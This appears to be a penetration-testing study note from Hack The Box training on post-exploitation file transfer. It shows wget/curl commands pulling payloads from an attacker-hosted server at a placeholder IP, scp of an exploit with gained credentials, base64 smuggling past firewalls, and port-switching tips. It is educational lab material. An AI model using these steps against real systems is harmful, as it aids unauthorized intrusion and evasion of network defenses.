**Category:** #Post-Exploitation / #Data-Exfiltration 
**HTB Module:** [[Getting Started]] / [[File Transfers]]

---

## 🌐 1. The Web Server Method (Most Common)

> **Logic:** You transform your attack machine into a temporary "Distribution Hub." The victim machine "pulls" the file using standard web protocols (HTTP).

### 🛠️ Step-by-Step

**1. On Attacker (Kali/Pwnbox):** Host the file from the directory it is located in:
```
python3 -m http.server 8000
```

**2. On Victim (Target Machine):** Use `wget` or `curl` to grab the payload:
```
# Using wget
wget http://[YOUR_IP]:8000/tool.sh

# Using curl (requires -o to save as a file)
curl http://[YOUR_IP]:8000/tool.sh -o tool.sh
```

---

## 🔑 2. The SCP Method (Authenticated Transfer)

> **Logic:** If you have gained credentials (Password or SSH Key), you can use the **Secure Copy Protocol**. This is encrypted and blends in with normal SSH traffic.

### 🚀 Command Syntax

```
scp [local_file] [user]@[target_IP]:[destination_path]
```

_Example:_ `scp exploit.py user@10.10.10.123:/tmp/exploit.py`

---

## 🧱 3. The Base64 Method (The "Lego" Trick)

> **Logic:** When network firewalls block all inbound/outbound downloads, we convert binary data into "safe" text characters (Base64).

### 🔄 The Workflow

1. **Encode (Attacker):** `base64 -w 0 file.exe` (Copy the giant string of text).
    
2. **Transfer:** Paste that text into the victim's terminal.
    
3. **Decode (Victim):** ```bash echo "PASTED_BASE64_STRING_HERE" | base64 -d > file.exe
    

---

## ⚠️ Common Pitfalls

- **Permissions:** Always check if your destination directory (like `/tmp` or `C:\Users\Public`) has **Write** permissions.
    
- **Firewalls:** If Port 8000 is blocked, try hosting your web server on **Port 80** or **443** (Standard Web/SSL ports).